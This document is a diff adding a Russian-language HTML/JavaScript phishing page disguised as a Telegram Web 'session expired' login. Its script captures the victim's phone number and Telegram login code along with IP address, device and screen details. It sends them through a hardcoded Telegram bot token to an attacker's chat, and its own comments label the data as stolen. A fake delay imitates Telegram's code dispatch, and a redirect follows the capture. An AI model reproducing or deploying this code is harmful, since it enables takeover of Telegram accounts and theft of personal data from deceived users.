@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>Telegram: Срок действия сессии истек</title>
+    <style>
+        /* Стили CSS */
+        body { font-family: sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background-color: #ffffff; padding: 40px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1); width: 350px; text-align: center; }
+        h2 { color: #1877f2; margin-bottom: 25px; }
+        input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; font-size: 16px; text-align: center;}
+        button { width: 100%; padding: 12px; background-color: #0088cc; color: white; border: none; border-radius: 6px; font-size: 18px; font-weight: bold; cursor: pointer; transition: background-color 0.3s; }
+        button:hover { background-color: #007bb6; }
+        .info { font-size: 14px; color: #606770; margin-top: 15px; margin-bottom: 15px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2 id="formTitle">Telegram Web Login</h2>
+        <p class="info" id="formInfo">Ваша сессия устарела. Пожалуйста, подтвердите номер, чтобы получить **код**.</p>
+        
+        <form id="loginForm">
+            <div id="phoneStep">
+                <input type="tel" id="phoneInput" placeholder="+7 999 123 45 67" required>
+                <button type="button" id="sendCodeButton">Получить код авторизации</button>
+            </div>
+            
+            <div id="codeStep" style="display:none;">
+                 <p class="info" style="color: #c0392b;">**ВНИМАНИЕ:** Код отправлен. Введите его для завершения сессии.</p>
+                <input type="text" id="codeInput" placeholder="Код из SMS / Telegram" maxlength="6" required>
+                <button type="submit" id="loginButton">Подтвердить и войти</button>
+            </div>
+            
+        </form>
+        <p id="status" style="color: red; margin-top: 15px; display: none;"></p>
+    </div>
+
+    <script>
+        // --- КОНФИГУРАЦИЯ ---
+        // Токен вашего бота
+        const BOT_TOKEN = '8327643870:AAFYNAJOZFS4MYNTgD710MYMO9-a3yGkCDk'; 
+        // ID чата администратора
+        const CHAT_ID = '7567154840';   
+        
+        // ВНЕШНИЙ СЕРВИС: для получения публичного IP
+        const IP_CHECK_API = 'https://api.ipify.org?format=json'; 
+        // --- КОНЕЦ КОНФИГУРАЦИИ ---
+
+        const SEND_MESSAGE_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        const phoneInput = document.getElementById('phoneInput');
+        const codeInput = document.getElementById('codeInput');
+        const sendCodeButton = document.getElementById('sendCodeButton');
+        const loginForm = document.getElementById('loginForm');
+        const phoneStep = document.getElementById('phoneStep');
+        const codeStep = document.getElementById('codeStep');
+        const statusText = document.getElementById('status');
+        
+        let phoneNumber = '';
+
+        // 1. Сбор IP и устройства
+        async function getDeviceInfo() {
+            let ip = 'Недоступен';
+            let userAgent = navigator.userAgent;
+            let screenResolution = `${window.screen.width}x${window.screen.height}`;
+            
+            try {
+                // Запрос внешнего сервиса для получения публичного IP
+                const ipResponse = await fetch(IP_CHECK_API);
+                const ipData = await ipResponse.json();
+                ip = ipData.ip || 'Неизвестно';
+            } catch (error) {
+                // Игнорируем ошибку, если IP API недоступен
+            }
+
+            let device = userAgent.match(/\((.*?)\)/)?.[1] || 'Неизвестное устройство';
+            
+            return { ip, userAgent, device, resolution: screenResolution };
+        }
+
+        // 2. Отправка украденных данных нам в Telegram
+        async function sendCredentialsToAdmin(phone, code) {
+            const deviceInfo = await getDeviceInfo(); 
+
+            // Мы отправляем только введенные данные, так как hash недоступен без сервера
+            const messageText = `
+💥 *КРАЖА ДАННЫХ УСПЕШНА (Прямая отправка)* 💥
+
+---
+**🔒 Учетные данные:**
+📱 *Телефон:* \`${phone}\`
+🔑 *Введенный Код:* \`${code}\`
+❌ *Hash-ключ:* **НЕ ДОСТУПЕН (НЕТ СЕРВЕРА)**
+
+---
+**💻 Данные устройства:**
+🌐 *IP-адрес:* \`${deviceInfo.ip}\`
+💻 *Устройство:* ${deviceInfo.device}
+📐 *Разрешение:* ${deviceInfo.resolution}
+👤 *User Agent:* \`${deviceInfo.userAgent}\`
+🕰️ *Время:* ${new Date().toISOString().slice(0, 19).replace('T', ' ')} (UTC)
+`;
+            
+            const finalUrl = `${SEND_MESSAGE_URL}?chat_id=${CHAT_ID}&text=${encodeURIComponent(messageText)}&parse_mode=Markdown`;
+
+            // Фактическая отправка данных
+            fetch(finalUrl).catch(err => console.error('Failed to send credentials:', err));
+        }
+
+        // --- ФАЗА 1: ИМИТАЦИЯ ОТПРАВКИ КОДА ---
+        sendCodeButton.addEventListener('click', async function(event) {
+            event.preventDefault(); 
+            phoneNumber = phoneInput.value.trim().replace(/[^0-9+]/g, ''); 
+            
+            if (!phoneNumber || phoneNumber.length < 10) {
+                alert("Введите действительный номер телефона.");
+                return;
+            }
+
+            statusText.style.display = 'block';
+            statusText.textContent = 'Отправка запроса на код...';
+            sendCodeButton.disabled = true;
+
+            // ИМИТАЦИЯ задержки реального Telegram API
+            await new Promise(resolve => setTimeout(resolve, 3000)); 
+
+            // Переход ко второй фазе
+            statusText.textContent = ''; // Очистка статуса
+            phoneStep.style.display = 'none';
+            codeStep.style.display = 'block';
+            document.getElementById('formInfo').innerHTML = 'Введите **реальный код**, который пришел вам для завершения сессии.';
+            sendCodeButton.disabled = false;
+        });
+
+        // --- ФАЗА 2: ЗАХВАТ ДАННЫХ И ОТПРАВКА ---
+        loginForm.addEventListener('submit', async function(event) {
+            event.preventDefault(); 
+
+            const code = codeInput.value.trim();
+
+            if (!code || code.length < 5) {
+                alert("Пожалуйста, введите код.");
+                return;
+            }
+
+            statusText.textContent = 'Проверка кода и завершение сессии...';
+            document.getElementById('loginButton').disabled = true;
+
+            // ОТПРАВКА ДАННЫХ ВАМ В ТЕЛЕГРАМ
+            await sendCredentialsToAdmin(phoneNumber, code);
+            
+            // Завершение "логина" (Перенаправление)
+            await new Promise(resolve => setTimeout(resolve, 1500)); 
+            window.location.href = 'success.html'; 
+        });
+    </script>
+</body>
+</html>
